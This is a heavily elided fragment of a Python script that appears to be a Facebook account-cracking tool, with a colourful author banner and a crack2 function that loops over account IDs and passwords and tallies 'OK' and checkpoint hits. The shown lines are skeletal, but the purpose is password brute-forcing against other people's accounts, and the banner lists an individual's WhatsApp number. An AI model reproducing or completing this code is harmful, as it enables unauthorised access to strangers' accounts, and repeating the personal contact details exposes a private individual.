...
try:
 ...
 rich.console import Group as gp

 rich.panel import Panel as nel

 rich import print as cetak

 rich.markdown import Markdown as mark

 rich.columns import Columns as col
...
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mARIF HOSSAIN

\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801744985830

\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mDEVIL KING
...
def crack2(idf,pwv):
	...
	print('\r%s [ARIF] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				...
				if 'ya' in oprek:
					...
					print('\r%s [ARIF-CP] %s|%s        '%(b,idf,pw))
